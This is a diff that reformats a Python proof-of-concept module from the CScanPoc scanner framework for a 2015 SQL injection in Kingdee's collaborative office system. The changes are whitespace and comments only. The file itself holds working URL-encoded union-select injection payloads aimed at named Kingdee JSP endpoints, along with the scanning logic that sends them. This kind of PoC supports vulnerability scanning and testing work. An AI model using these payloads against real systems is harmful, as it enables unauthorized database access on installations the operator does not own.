@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Kingdee_0001' # 平台漏洞编号，留空
+    vuln_id = 'Kingdee_0001'  # 平台漏洞编号，留空
     name = '金蝶协同办公系统 SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2015-08-26'  # 漏洞公布时间
     desc = '''
         金蝶协同办公系统文件参数过滤不严谨，造成SQL注入漏洞。
@@ -17,6 +18,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = '金蝶协同办公系统'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '6b5ff7e5-dad7-4542-8230-cc57c0b2e05a'
@@ -30,9 +32,9 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #refer:#http://www.wooyun.org/bugs/wooyun-2015-0136918
-            payloads=[
+
+            # refer:#http://www.wooyun.org/bugs/wooyun-2015-0136918
+            payloads = [
                 "/kingdee/tree/tree/announce/get_nodes.jsp?node=1%20union%20select%20NULL,sys.fn_varbintohexstr(hashbytes(%27MD5%27,%20%271234%27))--",
                 "/kingdee/tree/tree/announce/get_selected.jsp?ids=1)%20union%20select%20NULL,sys.fn_varbintohexstr(hashbytes(%27MD5%27,%20%271234%27))--",
                 "/kingdee/tree/tree/discuss/get_nodes.jsp?node=1%20union%20select%20NULL,sys.fn_varbintohexstr(hashbytes(%27MD5%27,%20%271234%27))--",
@@ -55,6 +57,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
